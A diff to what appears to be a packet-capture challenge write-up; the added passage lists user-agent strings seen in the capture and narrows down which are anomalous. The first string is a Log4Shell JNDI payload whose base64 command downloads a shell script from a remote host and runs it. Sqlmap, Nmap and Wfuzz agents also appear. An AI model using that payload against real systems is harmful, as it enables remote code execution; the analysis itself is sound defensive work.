@@ -538,7 +538,33 @@ This gives us four in total. The only problem with this is that it's not the ans
 
 <img width="407" height="173" alt="image" src="https://github.com/user-attachments/assets/9110f156-d140-4e3a-8520-53bea9fee2b3" />
 
-The adversary tried to be sneaky and make this look like a natural user-agent, but Grammarly wasn't installed on their system. This still isn't the right answer. We need one more. This last one took me quite some time to find
+The adversary tried to be sneaky and make this look like a natural user-agent, but Grammarly wasn't installed on their system. This still isn't the right answer. We need one more. This last one took me quite some time to find. As far as I can tell, there are 12 unique user-agent strings in this packet capture.
+```
+${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
+Google Chrome/83.0.4103.116 Windows
+Microsoft-WNS/10.0
+Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
+Mozlila/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
+sqlmap/1.4#stable (http://sqlmap.org)
+Wfuzz/2.4
+```
+Let's go by process of elimination. We know that number 1, 4, and 10-12 are already anomalous/malicious. This leaves:
+```
+Google Chrome/83.0.4103.116 Windows
+Microsoft-WNS/10.0
+Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
+```
+We first need to have a better understanding of user-agents, and the best place for that is [section 10.1.5 of the RFC 9110 publication
+](https://datatracker.ietf.org/doc/html/rfc9110#section-10.1.5).
 
 ### Question 2 - What is the packet number with a subtle spelling difference in the user agent field?
 
